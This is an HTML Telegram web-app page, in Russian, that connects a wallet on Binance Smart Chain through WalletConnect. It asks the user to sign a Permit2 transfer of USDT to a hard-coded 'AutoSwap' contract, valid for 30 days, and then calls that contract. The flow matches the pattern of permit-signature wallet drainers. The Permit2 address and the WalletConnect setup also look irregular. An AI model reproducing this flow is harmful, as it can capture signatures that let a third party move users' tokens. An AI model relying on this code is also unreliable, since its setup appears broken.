<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>WalletConnect v2 Permit2 + AutoSwap</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
  body { font-family: sans-serif; margin: 20px; background: #17212b; color: white; }
  button, input { padding: 10px; font-size: 16px; margin: 8px 0; width: 100%; max-width: 400px; }
  button { cursor: pointer; border: none; border-radius: 8px; background: #2ea6ff; color: white; }
  button:disabled { background: gray; cursor: not-allowed; }
  #walletInfo { margin: 12px 0; }
  #status { margin-top: 15px; min-height: 40px; color: #ffa726; }
</style>
</head>
<body>

<h2>WalletConnect v2 Permit2 + AutoSwap</h2>

<div id="walletInfo" style="display:none;">
  <div><b>Адрес:</b> <span id="account"></span></div>
  <div><b>Сеть:</b> <span id="chain"></span></div>
</div>

<input id="amount" type="text" placeholder="Сумма USDT в минимальных единицах (например, 1000000 = 1 USDT)" />
<button id="swapBtn" disabled>Сделать Swap</button>

<div id="status"></div>

<script type="module">
  import { Modal } from "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/esm/index.js";
  import WalletConnectEthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/esm/index.js";
  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/esm/index.js";

  const tg = window.Telegram?.WebApp;
  tg?.ready();

  const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
  const PERMIT2_CONTRACT = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
  const AUTOSWAP_CONTRACT = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
  const BSC_CHAIN_ID = 56;
  const USDT_TOKEN = "0x55d398326f99059fF775485246999027b3197955";

  const walletInfo = document.getElementById("walletInfo");
  const accountSpan = document.getElementById("account");
  const chainSpan = document.getElementById("chain");
  const swapBtn = document.getElementById("swapBtn");
  const amountInput = document.getElementById("amount");
  const statusDiv = document.getElementById("status");

  let provider;
  let accounts = [];
  let chainId;

  async function initWalletConnect() {
    try {
      statusDiv.textContent = "Инициализация WalletConnect...";

      const modal = new Modal({
        projectId: PROJECT_ID,
        themeMode: "dark",
        walletConnectVersion: 2,
        mobileLinks: ["trust"],
      });

      provider = new WalletConnectEthereumProvider({
        projectId: PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        showQrModal: false,
        rpcMap: {
          [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/",
        },
      });

      await modal.open();

      accounts = await provider.enable();
      chainId = await provider.request({ method: "eth_chainId" });

      modal.close();

      accountSpan.textContent = accounts[0] || "Нет аккаунтов";
      chainSpan.textContent = parseInt(chainId, 16);

      walletInfo.style.display = "block";

      if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
        statusDiv.style.color = "#ffa726";
        statusDiv.textContent = `⚠️ Переключитесь на сеть Binance Smart Chain (chainId: ${BSC_CHAIN_ID}) в кошельке`;
        swapBtn.disabled = true;
      } else {
        statusDiv.style.color = "white";
        statusDiv.textContent = "Кошелек подключен. Введите сумму и нажмите Swap.";
        swapBtn.disabled = false;
      }

      // Обработчики изменений аккаунтов и сети
      provider.on("accountsChanged", (newAccounts) => {
        accounts = newAccounts;
        accountSpan.textContent = accounts[0] || "Нет аккаунтов";
        console.log("Accounts changed:", accounts);
      });

      provider.on("chainChanged", (newChainId) => {
        chainId = newChainId;
        chainSpan.textContent = parseInt(chainId, 16);
        console.log("Chain changed:", chainId);
        if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
          statusDiv.style.color = "#ffa726";
          statusDiv.textContent = `⚠️ Смените сеть на Binance Smart Chain (${BSC_CHAIN_ID})`;
          swapBtn.disabled = true;
        } else {
          statusDiv.textContent = "Сеть правильная, можете делать swap.";
          swapBtn.disabled = false;
        }
      });

    } catch (e) {
      statusDiv.style.color = "#e64a45";
      statusDiv.textContent = "Ошибка подключения WalletConnect: " + (e.message || e);
      console.error(e);
      swapBtn.disabled = true;
    }
  }

  async function doSwap() {
    try {
      if (!provider || accounts.length === 0) {
        statusDiv.style.color = "#e64a45";
        statusDiv.textContent = "Сначала подключите кошелек.";
        return;
      }
      if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
        statusDiv.style.color = "#e64a45";
        statusDiv.textContent = "Неправильная сеть. Используйте Binance Smart Chain.";
        return;
      }
      const owner = accounts[0];
      const amountStr = amountInput.value.trim();
      if (!amountStr || !/^\d+$/.test(amountStr)) {
        statusDiv.style.color = "#e64a45";
        statusDiv.textContent = "Введите корректную сумму в минимальных единицах (целое число).";
        return;
      }
      const amount = amountStr;

      statusDiv.style.color = "white";
      statusDiv.textContent = "Генерируем подпись Permit2...";

      const nonce = Date.now();
      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600;

      const domain = {
        name: "Permit2",
        chainId: BSC_CHAIN_ID,
        verifyingContract: PERMIT2_CONTRACT,
      };

      const types = {
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" },
        ],
      };

      const message = {
        permitted: { token: USDT_TOKEN, amount: amount },
        spender: AUTOSWAP_CONTRACT,
        nonce: nonce,
        deadline: deadline,
      };

      const typedData = {
        types,
        domain,
        primaryType: "PermitTransferFrom",
        message,
      };

      const signature = await provider.request({
        method: "eth_signTypedData_v4",
        params: [owner, JSON.stringify(typedData)],
      });

      statusDiv.textContent = "Подпись получена. Отправляем swapForUser...";

      const iface = new ethers.utils.Interface([
        "function swapForUser(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes signature)",
      ]);

      const calldata = iface.encodeFunctionData("swapForUser", [
        owner,
        amount,
        nonce,
        deadline,
        signature,
      ]);

      const txParams = {
        from: owner,
        to: AUTOSWAP_CONTRACT,
        data: calldata,
      };

      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });

      statusDiv.style.color = "#66bb6a";
      statusDiv.textContent = "Транзакция отправлена! TxHash: " + txHash;

    } catch (err) {
      statusDiv.style.color = "#e64a45";
      statusDiv.textContent = "Ошибка: " + (err.message || err);
      console.error(err);
    }
  }

  swapBtn.onclick = doSwap;

  window.onload = initWalletConnect;
</script>

</body>
</html>